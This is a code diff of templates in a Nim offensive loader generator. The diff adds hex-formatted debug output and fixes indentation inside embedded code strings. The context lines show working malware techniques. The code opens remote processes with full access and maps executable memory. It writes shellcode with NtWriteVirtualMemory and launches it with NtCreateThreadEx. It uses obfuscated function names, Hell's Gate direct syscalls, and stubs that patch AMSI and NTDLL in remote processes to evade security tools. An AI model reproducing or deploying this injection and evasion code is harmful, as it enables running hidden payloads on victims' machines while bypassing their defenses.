@@ -42,7 +42,7 @@ let ShellcodeRemoteInjectMapSection * = """
             status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
             when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), status
+                echo obf("[*] NtOpenProcess: "), toHex(status)
 
             var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)
 
@@ -73,7 +73,7 @@ let ShellcodeRemoteInjectMapSection * = """
             status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)
 
             when defined(verbose):
-                echo obf("[*] NtWriteVirtualMemory: "), status
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             var lpMapAddressRemote = MapViewOfFile3(hMapFile, pHandle, nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
@@ -103,7 +103,7 @@ let ShellcodeRemoteInjectMapSection * = """
         
             status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
             when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), status
+                echo obf("[*] NtOpenProcess: "), toHex(status)
         
             when defined(Hellsgate):
                 if getSyscall(ntCreateTable):
@@ -164,6 +164,8 @@ let ShellcodeRemoteInjectMapSection * = """
                 pHandle,
                 lpMapAddressRemote, 
                 NULL, FALSE, 0, 0, 0, NULL)
+            when defined(verbose):
+                echo obf("[*] NtCreateThreadEx: "), toHex(status)
 
     injectCreateRemoteThread(enctext) 
 
@@ -638,9 +640,9 @@ let RemoteLoadAMSIStub* = """
             status = zuatzuastdiasyy(tHandle)
             status = zuatzuastdiasyy(pHandle)
             if(status == 0):
-            return true
+                return true
             else:
-            return false
+                return false
         else:
 
             when defined(GetSyscallStub):
@@ -762,9 +764,9 @@ let RemoteLoadAMSIStub* = """
             status = NtClose(pHandle)
 
             if(status == 0):
-            return true
+                return true
             else:
-            return false
+                return false
             when defined(GetSyscallStub):
                 # This doesn't work so far for some reason
                 when defined(DInvoke):
@@ -772,9 +774,9 @@ let RemoteLoadAMSIStub* = """
                 else:
                     success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
                 if (success):
-                when defined(verbose):
-                    echo obf("set back old protect")
-                    echo success
+                    when defined(verbose):
+                        echo obf("set back old protect")
+                        echo success
 
 """
 
@@ -1020,9 +1022,9 @@ let RemoteLoadNTDLLStub* = """
             status = zuatzuastdiasyy(tHandle)
             status = zuatzuastdiasyy(pHandle)
             if(status == 0):
-            return true
+                return true
             else:
-            return false
+                return false
         else:
 
             when defined(GetSyscallStub):
@@ -1143,9 +1145,9 @@ let RemoteLoadNTDLLStub* = """
             status = NtClose(pHandle)
 
             if(status == 0):
-            return true
+                return true
             else:
-            return false
+                return false
             when defined(GetSyscallStub):
                 # This doesn't work so far for some reason
                 when defined(DInvoke):
@@ -1153,8 +1155,8 @@ let RemoteLoadNTDLLStub* = """
                 else:
                     success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
                 if (success):
-                when defined(verbose):
-                    echo obf("set back old protect")
-                    echo success
+                    when defined(verbose):
+                        echo obf("set back old protect")
+                        echo success
 
 """
